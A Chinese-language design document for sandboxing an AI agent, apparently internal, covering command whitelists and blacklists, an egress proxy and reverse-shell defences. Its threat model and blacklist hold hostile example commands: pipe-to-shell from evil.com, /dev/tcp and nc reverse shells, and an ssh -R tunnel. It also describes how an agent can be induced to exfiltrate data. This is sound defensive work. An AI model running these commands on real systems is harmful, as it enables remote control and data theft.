# 云侧沙箱安全管控方案设计

> 版本：v1.1　日期：2026-11-20（v1.1 新增 §10 反弹 Shell 防御专项，更新 §2.1 / §5 / §8）
> 运行环境：Linux 沙箱容器，Docker 18.09.0 / containerd 1.2.0.300（cgroup v1，内核 3.10/4.x，无 eBPF）
> 沙箱内 Agent：OpenClaw（挂载 channel 实现）

---

## 1. 需求清单

| # | 需求 | 简述 |
|---|------|------|
| 1 | 默认权限范围 | 定义云侧沙箱默认权限支持的访问范围 |
| 2 | 文件安全 | 灰/白名单，均支持云侧管控 |
| 3 | 命令安全 | 黑/白/灰三种名单：黑禁、白放、灰需用户确认，均支持云侧管控 |
| 4 | 批量删除审批 | 多文件删除（含脚本执行）时的用户确认 |
| 5 | 安全网关 | (a) 出站管控：URL 黑名单、协议校验、请求大小/超时限制；(b) 入站管控：外部不可直接访问工作空间本地服务，默认不暴露宿主网络；均支持云侧管控 |
| 6 | HIPS 入侵检测 | 沙箱支持对接 HIPS 工具（接口人：冯经理） |
| 7 | 用户授权范围 | 调用云侧服务时携带用户授权范围（默认授权 + 用户交互授权） |
| 8 | 制品上传 OBS | 执行脚本或安装 skill/plugin/专家团时，对应文件上传 OBS |

## 2. 威胁模型与设计原则

### 2.1 威胁模型

- Agent 被诱导执行危险命令（`rm -rf`、数据外发、读取敏感文件）；
- 攻击载荷藏在脚本体内（`python3 evil.py`、`curl x | bash`、pip/npm 安装时执行任意代码），绕过命令字符串匹配；
- 混淆/编码绕过（base64、软链接改名、shell 内建、解释器 `-c`）；
- 反弹 shell：经合法出站通道（HTTPS/WebSocket 隧道、chisel/frp/ssh -R）建立交互式控制通道，进而窃取云元数据凭证、横向移动；
- Agent 进程反杀安全组件、篡改策略配置、直连外网绕过网关。

### 2.2 设计原则

1. **内联拦截，而非旁路监控**：事后"读 /proc → 杀进程"存在 TOCTOU 竞态，快操作（删文件、外发）毫秒级完成，防不住。所有管控点必须在执行路径上同步裁决。
2. **名单管"让不让跑"，内核管"跑了能怎样"，审计管"跑过留痕"**：三层各管一段，单层被绕过整体不失守。
3. **最小权限**：Agent 进程非 root、无 capabilities、只读根文件系统，敏感路径不挂载。
4. **策略云侧统一下发**：所有名单/授权由云侧控制面签名推送，本地配置只是缓存。
5. **硬边界与语言无关**：一旦允许执行任意脚本，安全保证必须来自内核层（iptables / seccomp / AppArmor / 挂载），与 Python/bash/二进制无关。

## 3. 总体架构

```
                        ┌─────────────────────────────┐
                        │      云侧控制面              │
                        │  · 策略中心（名单/版本/签名） │
                        │  · 审批回调（灰名单确认）     │
                        │  · 授权范围服务（scope）      │
                        │  · OBS（制品快照/审计）       │
                        └───────────┬─────────────────┘
                                    │ 签名策略 push / 审批回执
        ┌───────────────────────────┼───────────────────────────┐
        │ 沙箱容器                   ▼                           │
        │  ┌─────────────────────────────────────────────────┐  │
        │  │ Daemon（root, PID 1）— 策略引擎                  │  │
        │  │  · 策略缓存/校验签名/热更新                        │  │
        │  │  · Exec Broker（Unix socket，唯一命令入口）       │  │
        │  │  · 脚本扫描器（本地规则 + OBS 云扫）              │  │
        │  │  · 授权 scope 管理 + 云侧调用代发                 │  │
        │  │  · 事件总线 → HIPS 插件口 / OBS 上报              │  │
        │  └───────────┬───────────────────────┬─────────────┘  │
        │              │ spawn                 │ 事件           │
        │  ┌───────────▼──────────┐  ┌─────────▼──────────┐     │
        │  │ OpenClaw Agent       │  │ HIPS agent（冯经理）│     │
        │  │ （非 root, cap=空）   │  │ （插件，socket 接入）│     │
        │  └──────────────────────┘  └────────────────────┘      │
        │                                                         │
        │  内核边界（对所有进程生效，与启动方式无关）                 │
        │  · iptables：OUTPUT 默认 DROP，仅 proxy uid 可出网       │
        │  · 只读根 fs + 仅 workdir 可写 + 敏感路径不挂载           │
        │  · AppArmor profile / seccomp（禁 ptrace、mount 等）     │
        │  · no-new-privileges，cap-drop=ALL                      │
        └───────────────────────────┬─────────────────────────────┘
                                    │
        ┌───────────────────────────▼───────────────────────────┐
        │ 安全网关（独立服务/侧车）                               │
        │  · 出站：egress proxy（CONNECT）+ 内部 DNS resolver     │
        │  · 入站：gateway 反向代理，默认无任何端口暴露           │
        └───────────────────────────────────────────────────────┘
```

### 组件职责

| 组件 | 权限 | 职责 |
|------|------|------|
| Daemon | root，PID 1 | 策略引擎、Exec Broker、脚本扫描、scope 管理、事件上报。Agent 无权 kill/读取其内存 |
| OpenClaw Agent | 非 root 普通用户 | 所有命令经 Broker 发起；不持有云侧凭证；无外网直连能力 |
| 安全网关 | 独立部署 | 出/入站唯一通道，执行名单与限制 |
| 云侧控制面 | — | 策略/名单/授权/审批/OBS 的唯一权威源 |

## 4. 分需求详细设计

### 4.1 需求 1：默认权限范围

两层定义：

**容器层（启动参数固化，Agent 不可改）**
- 非 root 用户运行 Agent；`--cap-drop=ALL`；`no-new-privileges`
- 只读根文件系统 + tmpfs `/tmp`；仅工作目录（workdir）可写
- 敏感路径（`/etc`、`~/.ssh`、云元数据路径等）不挂载或以只读 bind mount 屏蔽
- seccomp：禁 `ptrace`、`mount`、`reboot`、`kexec_load` 等

**逻辑层（云侧下发 scope JSON）**
- 可访问的工作目录范围、可访问的云服务、默认授权项
- 格式见 §5 策略 Schema

### 4.2 需求 2：文件安全（灰/白名单）

| 名单 | 机制 | 说明 |
|------|------|------|
| 白名单 | 挂载层 | workdir 可写；其余路径只读或不挂载。天然"非白即拒" |
| 灰名单 | fanotify `FAN_OPEN_PERM` | Daemon 注册阻塞式事件：进程打开灰名单路径 → 挂起 → 云侧/前端确认 → 放行或拒绝。覆盖任何语言发起的 open |
| 黑名单（隐含） | AppArmor + 挂载 | 不在白/灰名单内的敏感路径直接不可达 |

- 名单支持路径、glob、目录前缀；云侧推送，Daemon 校验签名后热更新。
- 兜底：Agent 非 root，无法 chmod/mount 绕过。

### 4.3 需求 3：命令安全（黑/白/灰名单）

**唯一入口：Exec Broker。** OpenClaw 不直接持有 shell，所有命令通过 Broker 的 Unix socket RPC 发起，Daemon 同步裁决后 spawn。

裁决流程：

```
命令请求
  ├─ 解析 token（非原始字符串；递归解码 base64/hex；展开软链接真实路径）
  ├─ 命中黑名单 → 拒绝，返回结构化错误码（错误码 + 策略 ID，便于审计）
  ├─ 命中灰名单 → 挂起 → 云侧审批回调 → 确认后 spawn / 拒绝
  ├─ 白名单 → 直接 spawn
  └─ 默认策略（建议 default-deny 高危类目，default-allow 常规开发命令）
```

**脚本感知（关键扩展）**——解决"攻击藏在脚本体内"：

| 调用形式 | Broker 动作 |
|----------|-------------|
| `python3 /path/x.py` | 读脚本内容 → 本地规则扫描（`os.system`/`subprocess`/`socket`/敏感路径操作等）→ 可疑转灰名单 |
| `python3 -c "..."`、`echo … \| python3` | 内联代码等同脚本内容扫描 |
| `bash x.sh`、`source x.sh` | 同上 |
| `curl evil.com/x.py \| bash` | 远程代码执行模式，默认黑名单或强灰名单 |
| `pip install x` / `npm install x` | 安装即执行任意代码（setup.py/postinstall），**默认灰名单** |

扫描不出的混淆样本由需求 8 的 OBS 云扫兜底（§4.8），以及 §4.9 的内核边界兜底。

### 4.4 需求 4：批量删除审批

- Broker 解析命令：`rm` 带 `-r`/通配符/多参数，或展开后目标文件数 > 阈值 N → 转灰名单确认流程；
- **删除改隔离**：实际执行为 `mv` 到隔离回收区（如 `/.quarantine/<ts>/`），用户确认后才真删；误删可恢复；
- 脚本体内的删除无法静态解析 → 该脚本整体按灰名单对待（§4.3），且脚本已上传 OBS 可审计（§4.8）。

### 4.5 需求 5：安全网关

**(a) 出站管控**
- 容器网络 `iptables OUTPUT` 默认 DROP；仅 egress proxy 进程 uid 可出网（owner match）；
- 所有 Agent 流量强制走 **egress proxy（Squid/Envoy，CONNECT 模式）**：
  - 域名/IP 黑白名单（URL 黑名单拦截）；
  - 协议白名单（仅 HTTP/HTTPS，其余拒绝）；
  - 请求体大小限制、连接/读超时限制；
- DNS 走内部 resolver，做域名级过滤，防 DNS 隧道绕过；
- 名单由云侧推送至 proxy/resolver。

**(b) 入站管控**
- 容器**不发布任何端口**、禁用 host 网络；
- Agent 启动的本地 web 服务只监听 `127.0.0.1`；
- 需要对外暴露的服务，必须经 **gateway 反向代理**显式开通，且带鉴权 → "默认不暴露，显式才开通"；
- 开通规则云侧管控。

### 4.6 需求 6：HIPS 入侵检测

- Daemon 预留插件接口（Unix socket / gRPC），事件流（exec 记录、文件拒绝、网络拦截、扫描命中）实时推给 HIPS agent（冯经理）；
- 分工：Daemon 负责**喂数据 + 执行阻断**，HIPS 负责**检测判定**；HIPS 判定结果可回写 Daemon 转为阻断动作；
- 事件 Schema 与冯经理对齐（建议 JSON over socket，含 ts/pid/uid/事件类型/对象/判定）。

### 4.7 需求 7：用户授权范围

- Daemon 维护 **scope token**：默认授权（云侧下发）+ 交互授权（每次灰名单确认时累积的授权项，可设有效期/次数）；
- **Agent 不直接持有云侧凭证**：所有云侧 API 调用由 Daemon 代发，请求头附加 scope；
- 云侧服务校验 scope，超范围调用拒绝并记录。

### 4.8 需求 8：制品上传 OBS

- 触发点：Broker 执行脚本前、安装 skill/plugin/专家团时、pip/npm 安装时；
- 流程：计算内容哈希 → 已存在则跳过（去重）→ 向云侧申请签名 URL → 上传 OBS；
- 云侧拿到制品后可做重扫描（YARA/签名/语义分析），判定回写 Broker（allow/grey/deny），本地按哈希缓存判定；
- OBS 快照链 + 事件日志 = 完整审计："哪段代码、什么时间、干了什么"。

### 4.9 内核边界（兜底硬保证）

无论入口层是否被绕过，以下限制对容器内所有进程生效：

| 攻击意图 | 拦截点 |
|----------|--------|
| 直连外网外发数据 | iptables：非 proxy uid 出站全 DROP |
| 读敏感文件 | 路径未挂载 / 只读挂载 / AppArmor |
| 写工作目录外文件 | 只读根 fs |
| ptrace 其他进程 / 提权 | seccomp + no-new-privileges + cap-drop |
| 杀 Daemon / 改策略 | Agent 非 root，无权操作 root 进程与 root 拥有的只读策略缓存 |
| 端口暴露到宿主 | 不发布端口 + 仅 loopback 监听 |

## 5. 策略配置 Schema（草案）

```json
{
  "version": 42,
  "signature": "<云侧签名>",
  "scope": {
    "workdir": ["/workspace"],
    "cloud_services": ["obs", "approval", "policy"],
    "default_grants": ["fs:read:/workspace", "net:egress:proxy"]
  },
  "files": {
    "whitelist": ["/workspace/**"],
    "greylist": ["/workspace/.env", "**/*.pem"],
    "readonly": ["/etc/**"]
  },
  "commands": {
    "blacklist": [
      {"pattern": "rm -rf /", "reason": "E_DENY_ROOT_RM"},
      {"pattern": "curl * | *sh", "reason": "E_DENY_PIPE_EXEC"},
      {"pattern": "bash -i*", "reason": "E_DENY_REVSHELL"},
      {"pattern": "*/dev/tcp/*", "reason": "E_DENY_REVSHELL"},
      {"pattern": "nc *-e*", "reason": "E_DENY_REVSHELL"},
      {"pattern": "ssh *-R*", "reason": "E_DENY_REV_TUNNEL"}
    ],
    "whitelist": ["ls", "cat", "git status", "python3 --version"],
    "greylist": ["rm -r *", "pip install *", "npm install *", "curl *"],
    "delete_threshold": 3
  },
  "network": {
    "egress": {
      "domain_blacklist": ["*.evil.com"],
      "domain_whitelist": [],
      "new_domain_policy": "grey",
      "protocols": ["http", "https"],
      "connect_allow_ports": [443],
      "tls_intercept": true,
      "websocket": "grey",
      "max_request_bytes": 10485760,
      "max_session_seconds": 300,
      "beacon_detect": true,
      "connect_timeout_ms": 5000,
      "read_timeout_ms": 30000,
      "deny_ip_ranges": ["169.254.169.254/32", "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"]
    },
    "ingress": { "expose_via_gateway_only": true }
  },
  "reverse_shell": {
    "fd_socket_scan_interval_ms": 2000,
    "pty_audit": true,
    "abnormal_parent_detect": true,
    "on_detect": "freeze_kill_report"
  },
  "obs": { "bucket": "sandbox-artifacts", "dedup_by_hash": true },
  "hips": { "socket": "/run/safe/hips.sock", "enabled": true }
}
```

- Daemon 校验签名与版本号后热更新；落盘配置为只读缓存（root 拥有，Agent 不可读改）。
- 错误返回为结构化错误码 + 策略 ID（如 `E_DENY_PIPE_EXEC`），替换原"固定报错文案"，便于审计与前端展示。

## 6. 关键接口（草案）

**Exec Broker（Unix socket，JSON-RPC）**
```json
→ {"method": "exec", "cmd": "python3", "argv": ["x.py"], "cwd": "/workspace"}
← {"verdict": "allow | deny | pending", "error_code": "...", "exec_id": "...", "pid": 1234}
```

**审批回调（Daemon ↔ 云侧）**
```json
→ {"exec_id": "...", "type": "command_grey | file_grey | batch_delete", "detail": {...}}
← {"exec_id": "...", "approved": true, "grant_scope": ["fs:delete:/workspace/tmp/*"]}
```

**HIPS 事件**
```json
{"ts": 1700000000, "pid": 123, "uid": 1000, "event": "file_open_denied",
 "target": "/etc/shadow", "policy_id": "files.readonly", "verdict": "deny"}
```

## 7. 老版本环境约束（Docker 18.09 / containerd 1.2）

| 能力 | 状态 | 替代 |
|------|------|------|
| eBPF | 不可用（内核 3.10/4.x） | fanotify / inotify / iptables owner match |
| AppArmor | 取决于宿主机，需先确认 | 不可用则退回 bind mount + fanotify |
| seccomp | 可用 | — |
| cgroup | v1 | — |
| runc | 老版本有已知逃逸 CVE | 至少升级到补丁版本 |

## 8. 落地路线图

| 阶段 | 内容 | 覆盖需求 |
|------|------|----------|
| P0 | Exec Broker + 命令三名单 + 结构化错误码 | 3 |
| P1 | 容器权限收敛（非 root/cap/seccomp/只读 fs）+ 文件白名单挂载 | 1, 2(白) |
| P2 | iptables + egress proxy + DNS 过滤 + 入站 gateway；代理 CONNECT 端口白名单 + TLS 拦截；封禁元数据/内网网段 | 5, 反连L0/L1 |
| P3 | 灰名单确认链路（Broker 挂起 / fanotify ↔ 云侧审批回调）+ 批量删除隔离区 | 2(灰), 3(灰), 4 |
| P4 | scope 授权管理 + 云侧代发；OBS 上传 + 云扫回写 | 7, 8 |
| P5 | HIPS 插件接口联调（冯经理）；反弹 shell 运行时检测（fd/pty/父子关系扫描）接入 HIPS | 6, 反连L3 |

Daemon 建议 Go 实现（静态编译、低开销、适合 PID 1 守护）。

## 9. 与原方案的差异说明

| 原方案 | 本方案 | 原因 |
|--------|--------|------|
| 读 /proc 发现违规后 kill | Exec Broker 执行前同步裁决 | 杀进程是事后动作，快操作已完成，TOCTOU 竞态防不住 |
| 进程信息匹配命令名单 | token 级匹配 + 脚本内容扫描 + 内核边界兜底 | 改名/编码/脚本体内攻击可绕过进程表匹配 |
| JSON 配置只读 | root 拥有 + 签名校验 + Agent 非 root | 只读权限位对 root 无效 |
| 固定报错文案 | 结构化错误码 + 策略 ID | 便于审计、前端展示与策略调优 |

---

## 10. 补充专项：反弹 Shell 防御（v1.1 新增）

> 底线目标：**即使攻击者在沙箱内获得任意代码执行，甚至建立起交互式反连通道，沙箱边界也不得被击穿**（无法提权、无法出网绕过网关、无法横向移动、无法瓦解安全组件）。
> 设计思路：反弹 shell 按"**通道切断 → 通道管控 → 运行检测 → 爆炸半径收敛**"四层处理；不依赖单点检测，默认假设检测会失效。

### 10.1 攻击面与本沙箱的先天处境

| 手法 | 典型载荷 | 在本沙箱的处境 |
|------|----------|----------------|
| 原始 TCP 反连 | `bash -i >& /dev/tcp/ip/4444 0>&1`、`nc -e`、`python socket+dup2` | **先天死亡**：iptables owner match，仅 proxy uid 可出网，任意 `connect()` 直连被 DROP |
| Bind shell | `nc -l -p 4444 -e /bin/sh` | **先天死亡**：容器无端口发布、INPUT DROP、仅 loopback 可达，外部连不进来 |
| SSH 反向隧道 | `ssh -R 8080:localhost:22 attacker` | 出站协议白名单仅 HTTP/HTTPS，22 端口与 SSH 协议在代理层拒绝 |
| **隧道化反连（主战场）** | chisel/frp/ngrok、WebSocket shell、HTTP 轮询 C2 | 骑在唯一放行的 HTTPS 通道上，**必须在代理层解决**（§10.2-L1） |
| DNS 隧道 | iodine/dnscat2 | 内部 resolver 限速 + 记录类型限制 + 高熵子域检测 |
| 横向移动 | 访问云元数据 `169.254.169.254`、内网服务 | iptables/proxy 封禁元数据 IP 与 RFC1918 网段（除 gateway/DNS） |

### 10.2 防御分层

**L0 通道切断（已有机制确认项）**
- iptables：非 proxy uid 出站全 DROP；INPUT 默认 DROP；封禁 `169.254.169.254` 与内网网段；
- 容器不发布端口，禁用 host 网络；本地服务仅 loopback。

**L1 代理层管控（主战场）**——隧道化反连唯一存活的通道，逐条掐死：

| 控制项 | 作用 |
|--------|------|
| `connect_allow_ports: [443]` | CONNECT 只允许 443，代理不能被当作通用 TCP 隧道（堵 `CONNECT ip:任意端口`） |
| `tls_intercept: true` | **沙箱镜像是我们自己的，预置私有根 CA**，代理做 TLS 拦截 → 隧道工具特征、shell 流量内容可见可检。这是对抗 HTTPS 隧道的关键手段 |
| `websocket: grey` | WebSocket 升级请求默认转灰名单/云侧审批（交互 shell 最爱用 WS） |
| `new_domain_policy: grey` | 未见过的域名先确认后放行；高安全模式可切 default-deny 白名单 |
| 行为检测 | 长连接时长上限（`max_session_seconds`）、单连接字节上限、固定间隔小包（beacon 特征）告警并断连 |
| DNS | resolver 限速、限制 TXT/NULL 记录、高熵子域检测 |

**L2 进程层减速带（不作为安全边界）**
- 沙箱镜像**不预装** nc/ncat/socat/chisel/frp/ssh client（python 仍在，故仅减速带）；
- 命令黑名单：`bash -i`、`/dev/tcp/`、`nc -e`、`ssh -R` 等特征串（可被绕过，但低成本且产生审计事件）；
- 脚本扫描规则：`socket` + `dup2` + `pty`/`exec` 组合 → 直接黑名单；
- 挂载加固：`/tmp` 挂 `noexec,nosuid,nodev`，workdir 挂 `nosuid,nodev`，落地二进制不可执行/不可提权。

**L3 运行时检测（检测→处置，与 HIPS 联动）**

| 检测信号 | 原理 |
|----------|------|
| Daemon 周期扫 `/proc/*/fd`：进程的 fd 0/1/2 是 socket | 反连 shell 的强特征（dup2 把 socket 接到标准输入输出） |
| 非 Broker 派生的 pty/TMX 分配（`pty_audit`） | `pty.spawn` 是交互 shell 标配 |
| 异常父子关系：shell 进程的父进程是 python/nc 等非终端进程 | 正常 shell 由 Broker 派生 |
| 代理侧：超长会话、WS 长连接、beacon 节律 | 隧道/C2 流量画像 |

命中处置（`on_detect: freeze_kill_report`）：
1. cgroup v1 freezer **先冻结**进程树（防自清理、保留证据）；
2. 采集上下文（`/proc/pid/cmdline`、连接五元组、父链）→ 事件推 HIPS、快照传 OBS；
3. kill 进程树，结构化错误码返回。

> 注：此处"检测后处置"与 §2.2 反对的"旁路监控"不矛盾——L0/L1 已把反连能力削到只剩受控代理通道，L3 的检测对象是"已建立的可疑会话"，处置窗口足够；且真正的底线在 L4，不依赖 L3 必然检出。

**L4 爆炸半径收敛（底线，假设反连已成功）**

攻击者即使拿到交互式 shell，面对的仍是：

| 攻击者想 | 实际结果 |
|----------|----------|
| 提权到 root | 非 root + no-new-privileges + cap-drop=ALL + seccomp 禁 ptrace → 无路径 |
| 直连 C2 绕过代理 | iptables owner match → DROP |
| 偷云凭证/横向 | 无云侧凭证（Daemon 代发）；元数据与内网网段被封禁 |
| 杀 Daemon / 改策略 / 篡改代理 | 无权操作 root 进程；策略 root 拥有 + 签名校验 |
| 持久化 | 只读根 fs + tmpfs noexec，重启即清 |
| 读敏感数据 | 敏感路径未挂载；灰名单文件有 fanotify 确认 |

**结论：反连 shell 的最大爆炸半径 ≤ Agent 普通用户已有的权限，且所有流量仍在可审计通道内。底线不依赖"检测永远有效"，而由权限与网络拓扑硬性保证。**

### 10.3 残余风险与待办

- **TLS 拦截的工程细节**：私有 CA 需注入沙箱镜像信任库；注意证书固定（certificate pinning）的客户端会失败 → 这类失败连接本身即告警事件；
- **合法域名上的 C2**（如滥用 CDN/云函数域前置）：靠 `new_domain_policy` + 行为检测缓解，残余风险接受并审计；
- **代理自身安全**：egress proxy 是新的攻击面，需独立加固与最小权限部署；
- 待办：与冯经理对齐 L3 检测信号的事件 Schema；评估 TLS 拦截对开发体验的影响（必要时按域名白名单豁免）。
